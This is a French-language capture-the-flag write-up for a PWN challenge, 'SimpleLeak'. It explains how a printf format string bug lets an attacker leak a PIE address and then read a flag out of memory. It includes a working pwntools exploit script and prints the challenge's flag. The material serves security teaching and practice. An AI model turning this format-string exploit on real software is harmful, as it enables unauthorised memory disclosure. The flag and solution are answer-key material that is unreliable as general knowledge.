# SimpleLeak
## <u>**CatÃ©gorie**</u>

PWN

## <u>**Description**</u> :

[Noiche] : Hey you, give me your NAME !
[Noiche] : ... If you want to, of course.

FORMAT DU FLAG : Flag donné par le process qui tourne en remote, MCTF{...}

ACCES AU CHALLENGE :

Code source fourni + accès remote

## <u>Hints</u> 

Compiled using no specific flags on an up to date Manjaro. As easy as PIE :)

## <u>Auteur</u> 

Noiche

## <u>Solution</u> :

On remarque tout de suite à la lecture du code que le programme est vulnérable aux format string, puisque printf est utilisé en passant directement la variable.
En leakant quelques valeurs avec par exemple la format string "%x" ou "%lx", on peut déduire qu'il s'agit d'un programme compilé en x64 avec la PIE activée

(notamment en repérant des adresses telles que 0x00005570d3214169 par exemple). La première vulnérabilité de format string permet de leak une adresse de ce style, pour la réutiliser ensuite dans les autres couples fgets/printf.

L'idée est de leak le flag, donc il faut trouver où il se trouve, puisque PIE est activé. Pour ça, on peut essayer de bruteforce ou, mieux, de compiler le code source fourni pour regarder l'offset entre le flag en .data et l'adresse leakée. Même si le faux flag n'est pas de la même taille que le vrai, on devrait pouvoir bruteforce l'écart sans trop de soucis.

Une fois le bon offset trouvé, on peut commencer à leak, cependant printf s'arrête au premier nullbyte rencontré et le flag semble constitué de nullbytes entre chaque caractère. On va donc devoir leak le flag caractère par caractère.

Pour flag, il suffit donc de boucler tant que le caractère leaké n'est pas "}", et d'ajouter 2 à l'adresse à chaque fois (pour sauter le nullbyte et arriver sur le caractère suivant)

Script final :

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = "error"

OFFSET = 0x2ef7
step = 0
flag = b""

while True:
   io = process("./SimpleLeak")
   io.recvuntil(b"?")
   io.sendline(b"%17$lx")

   res = io.recvuntil(b"here :")
   leak_pie = int("0x" + res.split(b"\n")[2].decode(), 16)
   flag_loc = leak_pie + OFFSET + step

   payload = p64(flag_loc)
   io.sendline(payload)

   io.recvuntil(b"here :")
   io.sendline(b"%8$s")

   res = io.recvuntil(b"Bye").split(b"\n")[5]
   step += 2
   io.close()

   flag += res

   if b"}" in res:
      break

   sleep(0.3)

print("\n [FLAG] : " + flag.decode())
```

##**Flag : MCTF{Fmt_String_Are_Dangerous!}**
